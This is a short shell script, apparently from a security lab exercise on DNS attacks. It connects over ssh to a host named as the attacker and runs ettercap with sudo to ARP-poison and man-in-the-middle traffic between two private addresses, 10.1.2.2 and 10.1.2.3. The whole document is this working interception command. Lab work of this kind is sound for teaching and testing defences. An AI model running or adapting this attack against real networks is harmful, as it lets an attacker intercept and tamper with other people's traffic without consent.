 #!/bin/sh
ETH=$1
ssh attacker.facchinetti-dns.offtech sudo ettercap --text --iface ${ETH} --nosslmitm --nopromisc --only-mitm --mitm arp /10.1.2.2/// /10.1.2.3///